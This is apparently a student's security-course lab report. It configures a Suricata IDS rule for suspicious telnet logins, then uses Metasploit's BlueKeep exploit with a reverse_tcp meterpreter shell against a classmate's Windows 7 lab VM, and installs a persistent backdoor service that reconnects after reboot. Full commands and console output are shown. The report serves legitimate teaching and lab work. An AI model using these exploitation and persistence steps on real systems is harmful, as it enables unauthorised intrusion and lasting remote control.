# OT Lab 2 Maintain Access & Covert Channels

Artem Abramov



## Task 1 - Setup IDS/IPS

My machine in the lab where I have setup a network, became unaccessible after 12th Aptil. I setup an analogous network in my local machine with GNS3 and showed how to configure Suricata to catch an outside threat. 

My setup of Lab 1 in GNS3 is below:

- cloud that is connected to interface directly on SNE lan
- perimeter vm (has webmin vulnerable to RCE exploit)
- webserver, mailserver and admin machines on internal network
- ethernet switch (connecting perimeter, webserver, admin machines)
- ethernet hub between perimeter and admin as a poor-man's Port Mirroring (described in detail below)



Attack scenario:

- get into perimeter machine using Webmin RCE
- do arp spoofing to sniff traffic going from admin vm to webserver vm

- wait until administrator starts telnet connection from admin vm to webserver vm
- discover unencrypted user+password send in telnet traffic 
- use credentials to login to webserver vm
- profit



Network topology is shown below:

![](OT-Lab-2-exploit-and-persistance.assets/Screenshot%20from%202020-04-15%2021-48-38.png)

The plan is to use Suricata as the IDS and to install it on the Admin machine



**Configuring port-mirroring for IDS**

Admin has two interfaces ens3 and ens2. The Hub1 and ens3 connection make up a poor-man's Port Mirroring solution. The ens3 interface on Admin machine is UP but configured in promiscuous mode, this way it can only read packets and drops all outgoing packets. This means that when connecting from Admin to Webserver the packets will go via ens2 interface (and will not be seen by Perimeter machine). Attacker will need to use ARP spoofing to get the telnets packets going from Admin to the Webserver.



**Overview**

To install Suricata I used the following repository: https://github.com/nn-df/suricata-installation

During installation I requested that suricata listen on port "ens3" (there is a naming issue between GNS3 interfaces and the interface names inside the VM, so ens6 here is actually ens3 in the diagram):

```
Available interface: ens3
Available interface: ens4
Available interface: ens5
Available interface: ens6

Which Interface you want suricata to Listen(captured)?
Interface: ens6
```

Check version:

```
# suricata -V
This is Suricata version 5.0.2 RELEASE
```

The logs are in /var/log/suricata/ the config file in /etc/suricata/suricata.yaml

The logs grow very fast though although the traffic was not that much.  E.g. after about one hour of usage:

```
:/var/log/suricata# ls -lah
total 1.1M
drwxr-xr-x  5 root root   4.0K Apr 13 19:38 .
drwxrwxr-x 14 root syslog 4.0K Apr 13 19:04 ..
drwxr-xr-x  2 root root   4.0K Feb 13 17:58 certs
drwxr-xr-x  2 root root   4.0K Feb 13 17:58 core
-rw-r--r--  1 root root   618K Apr 13 19:50 eve.json
-rw-r--r--  1 root root      0 Apr 13 19:05 fast.log
drwxr-xr-x  2 root root   4.0K Feb 13 17:58 files
-rw-r--r--  1 root root   323K Apr 13 19:50 stats.log
-rw-r--r--  1 root root    79K Apr 13 19:35 suricata.log
-rw-r--r--  1 root root   2.0K Apr 13 19:35 suricata-start.log
```

Extract from suricata log:

```
[5346] 15/4/2020 -- 19:35:36 - (suricata.c:1084) <Notice> (LogVersion) -- This is Suricata version 5.0.2 RELEASE running in SYSTEM mode
[5346] 15/4/2020 -- 19:35:36 - (util-cpu.c:171) <Info> (UtilCpuPrintSummary) -- CPUs/cores online: 1
[5346] 15/4/2020 -- 19:35:36 - (util-device.c:329) <Config> (LiveBuildDeviceListCustom) -- Adding interface ens6 from config file
[5346] 15/4/2020 -- 19:35:36 - (util-luajit.c:98) <Config> (LuajitSetupStatesPool) -- luajit states preallocated: 128
[5346] 15/4/2020 -- 19:35:36 - (util-mpm.c:293) <Info> (MpmTableSetup) -- SSSE3 support not detected, disabling Hyperscan for MPM
[5346] 15/4/2020 -- 19:35:36 - (util-spm.c:102) <Info> (SinglePatternMatchDefaultMatcher) -- SSSE3 support not detected, disabling Hyperscan for SPM
[5346] 15/4/2020 -- 19:35:36 - (app-layer-htp.c:2482) <Config> (HTPConfigSetDefaultsPhase2) -- 'default' server has 'request-body-minimal-inspect-size' set to 31844 and 'request-body-inspect-window' set to 4108 after randomization.
[5346] 15/4/2020 -- 19:35:36 - (app-layer-htp.c:2500) <Config> (HTPConfigSetDefaultsPhase2) -- 'default' server has 'response-body-minimal-inspect-size' set to 41626 and 'response-body-inspect-window' set to 16535 after randomization.
[5346] 15/4/2020 -- 19:35:36 - (app-layer-smb.c:344) <Config> (RegisterSMBParsers) -- SMB stream depth: 0
[5346] 15/4/2020 -- 19:35:36 - (app-layer-modbus.c:1543) <Config> (RegisterModbusParsers) -- Protocol detection and parser disabled for modbus protocol.
[5346] 15/4/2020 -- 19:35:36 - (app-layer-enip.c:442) <Config> (RegisterENIPUDPParsers) -- Protocol detection and parser disabled for enip protocol.
[5346] 15/4/2020 -- 19:35:36 - (app-layer-dnp3.c:1626) <Config> (RegisterDNP3Parsers) -- Protocol detection and parser disabled for DNP3.
[5346] 15/4/2020 -- 19:35:36 - (util-ioctl.c:112) <Info> (GetIfaceMTU) -- Found an MTU of 1500 for 'ens6'
[5346] 15/4/2020 -- 19:35:36 - (util-ioctl.c:112) <Info> (GetIfaceMTU) -- Found an MTU of 1500 for 'ens6'
```



**Configuration**

To tell suricata what traffic to monitor, you need to tell suricata to load rules (from a rule file) by specifying that rule file in suricata.yaml 

Extract from suricata.yaml that shows how to specify the files:

```
##
## Configure Suricata to load Suricata-Update managed rules.
##
## If this section is completely commented out move down to the "Advanced rule
## file configuration".
##

default-rule-path: /etc/suricata/rules

rule-files:
  - suricata.rules
  - http-events.rules
  - app-layer-events.rules
  - decoder-events.rules
```

In my case the rules were installed into:

```
# ls /etc/suricata/rules/
app-layer-events.rules  http-events.rules      smb-events.rules
decoder-events.rules    ipsec-events.rules     smtp-events.rules
dhcp-events.rules       kerberos-events.rules  stream-events.rules
dnp3-events.rules       modbus-events.rules    tls-events.rules
dns-events.rules        nfs-events.rules
files.rules             ntp-events.rules
```



**Simple test**

To do a REALLY simple test, add the following rule at the top of http-events.rules (and maku sure to load http-event.rules):

```
alert http any any -> any any (msg:"SURICATA HTTP ARTEM error"; sid:9999998; rev:1;)
```

Then any HTTP traffic (e.g. `curl http://testmyids.com/`) will generate multiple entries in /var/log/suricata/fast.log as below:

```
# cat fast.log 
04/15/2020-21:58:57.981950  [**] [1:9999998:1] SURICATA HTTP ARTEM error [**] [Classification: (null)] [Priority: 3] {TCP} 10.10.10.3:40352 -> 31.3.245.133:80
```

Where we can see the details of the packet that matched the rule.



**Detect suspicious traffic**

sources: 

- https://github.com/seanlinmt/suricata/blob/master/files/rules/emerging-telnet.rules
- https://suricata.readthedocs.io/en/suricata-5.0.2/rules/intro.html

Then write a rule to detect suspicious telnet, for example telnet traffic that is not from Admin machine. 

Rule for suspicious telnet traffic is shown below (the `|3A|` is ASCII escape for `colon`):

```
# cat /etc/suricata/rules/suricata.rules 
alert tcp !$ADMIN 23 -> $HOME_NET any (msg:"TELNET suspicious login attempt"; flow:from_server,established; content:"login|3A|"; fast_pattern:only; classtype:suspicious-login; sid:2100719; rev:8;)
```

This also required adding the $ADMIN variable to suricata.yaml as shown below:

```
vars:
  address-groups:
    ADMIN: "[10.10.10.2]"
```

The last step is to test, that is try to login to telnet server on Webserver machine from Perimeter machine using admin credentials (supposedly sniffed previously with arp spoofing). The line below appears in the fast.log:

```
# cat fast.log 
04/15/2020-22:34:34.003841  [**] [1:2100719:8] TELNET suspicious login as user gns3 [**] [Classification: An attempted login using a suspicious username was detected] [Priority: 2] {TCP} 10.10.10.3:23 -> 10.10.10.1:55118
```

This alert will also be visible in the eve.json log and will show up on whatever dashboard/notification service the administrator is using.



## Task 2 - Pentest your opponents

I choose to hack team Hamid & Rodrigo.

My machine was not accessible, however Pierre provided a VM on the SNE network.

First step was to install metasploit. (source https://metasploit.help.rapid7.com/docs/installing-the-metasploit-framework#section-installing-the-metasploit-framework-on-linux )

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

Running msfconsole is shown below:

```
root@artemrescue:~# msfconsole 
[-] ***rting the Metasploit Framework console...-
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v5.0.85-dev-                         ]
+ -- --=[ 2000 exploits - 1091 auxiliary - 342 post       ]
+ -- --=[ 560 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn more

msf5 >
```



I knew that I could use the Bluekeep vulnerability. So I searched for that and choose the second one:

```
msf5 > search bluekeep

Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep    2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   1  exploit/windows/rdp/cve_2019_0708_bluekeep_rce  2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free


msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```



For the payload I decided to use reverse_https (similar to reverse_tcp but with more options):

(source: https://metasploit.help.rapid7.com/docs/working-with-payloads)

```
> set payload windows/x64/meterpreter/reverse_https
```



Then I set the necessary options as shown below:

```
> set RHOSTS 192.168.38.144
RHOSTS => 192.168.38.144
> set LHOST 10.1.1.9
LHOST => 10.1.1.9
```



Options overview:

```
> options

Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during...
   RDP_CLIENT_NAME  ethdev           no        The client computer name to report durin...
   RDP_DOMAIN                        no        The client domain name to report during... 
   RDP_USER                          no        The username to report during connect...
   RHOSTS           192.168.38.144   yes       The target host(s), range CIDR identif...
   RPORT            3389             yes       The target port (TCP)


Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread... 
   LHOST     10.1.1.9         yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting
```



At this point I realized that they had setup two networks behind NAT, and that attacking host 192.168.38.144 could only be done from a machine on that network. It turns out they had such a machine with TeamViewer. So I used that. 

Turns out that reverse_https exploit did not work for some reason, so  if a payload is not specified for bluekeep by default metasploit will try to use the windows/meterpreter/reverse_tcp payload, so actually I left it at that instead of messing around with reverse_https). The target machine ip was 192.168.38.144, my options now looked as below:

```
> options

Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during 
   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during 
   RDP_DOMAIN                        no        The client domain name to report during 
   RDP_USER                          no        The username to report during connect, 
   RHOSTS           192.168.38.141   yes       The target host(s), range CIDR identifier, 
   RPORT            3389             yes       The target port (TCP)


Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process
   LHOST     192.168.38.141   yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Automatic targeting via fingerprinting
```



Unfortunately running reverse_https failed with:

```
[*] Started HTTPS reverse handler on https://192.168.38.140:8443
[*] 192.168.38.141:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 192.168.38.141:3389   - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.38.141:3389   - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.38.141:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
[!] 192.168.38.141:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.38.141:3389 - Surfing channels ...
[*] 192.168.38.141:3389 - Lobbing eggs ...
[*] 192.168.38.141:3389 - Forcing the USE of FREE'd object ...
[!] 192.168.38.141:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Exploit completed, but no session was created.
```



But after switching to reverse_tcp payload and specifying the windows target (` Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)`) things finally worked:

```

[*] Started reverse TCP handler on 192.168.38.140:8443 
[*] 192.168.38.141:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 192.168.38.141:3389   - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.38.141:3389   - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.38.141:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
[!] 192.168.38.141:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.38.141:3389 - Surfing channels ...
[*] 192.168.38.141:3389 - Lobbing eggs ...
[*] 192.168.38.141:3389 - Forcing the USE of FREE'd object ...
[!] 192.168.38.141:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Sending stage (206403 bytes) to 192.168.38.141
[*] Meterpreter session 1 opened (192.168.38.140:8443 -> 192.168.38.141:49510) at 2020-04-15 08:35:27 -0700

meterpreter > 
```



Checking the system info:

```
meterpreter > sysinfo
Computer        : HAMID-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : H
Logged On Users : 1
Meterpreter     : x64/windows
```





## Task 3 - Maintain Access (persistance)

To maintain persistent access metasploit offers a way to create a service on windows that will run and persist after reboots. (source: https://www.rapid7.com/db/modules/exploit/windows/local/persistence_service)

The idea is that we get a shell first (in task 2) and use that channel to copy the service files to the target machine. So I put the first session (session number 1) into background in meterpreter and configured the persistent_service exploit. In particular I configured it to use connection from session 1. Options are shown below:

```
msf5> use exploit/windows/local/persistence_service
> options

Module options (exploit/windows/local/persistence_service):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   REMOTE_EXE_NAME                       no        The remote victim name. Random string 
   REMOTE_EXE_PATH                       no        The remote victim exe path to run. Use 
   RETRY_TIME           5                no        The retry time that shell connect 
   SERVICE_DESCRIPTION                   no        The description of service. Random .
   SERVICE_NAME                          no        The name of service. Random string as .
   SESSION              1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, 
   LHOST     192.168.38.140   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows
```



Running the exploit:

```
msf5 exploit(windows/local/persistence_service) > exploit

[*] Started reverse TCP handler on 192.168.38.140:4444 
[*] Running module against HAMID-PC
[+] Meterpreter service exe written to C:\Windows\TEMP\etqG.exe
[*] Creating service RbRebR
[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/HAMID-PC_20200415.4142/HAMID-PC_20200415.4142.rc
[*] Sending stage (180291 bytes) to 192.168.38.141
[*] Meterpreter session 2 opened (192.168.38.140:4444 -> 192.168.38.141:49513) at 2020-04-15 08:41:43 -0700

meterpreter >
```



To verify that the service was persistent I decided to reboot windows machine and attempt to reconnect to it. Rebooting (force immediate):

```
C:\Windows\system32>shutdown /f
[*] 10.1.1.100 - Meterpreter session 2 closed.  Reason: Died
```



Now we run a handler to connect back to the machine (source: http://en.redinskala.com/starting-a-handler-with-metasploit/)

```
use exploit/multi/handler 
```

Options:

```
> options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process
   LHOST     192.168.38.140   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```



And it is successful:

```
> exploit

[*] Started reverse TCP handler on 192.168.38.140:4444 
[*] Sending stage (180291 bytes) to 192.168.38.141
[*] Meterpreter session 3 opened (192.168.38.140:4444 -> 192.168.38.141:49181) at 2020-04-15 08:54:46 -0700


meterpreter > 
meterpreter > sysinfo
Computer        : HAMID-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : H
Logged On Users : 0
Meterpreter     : x86/windows
```

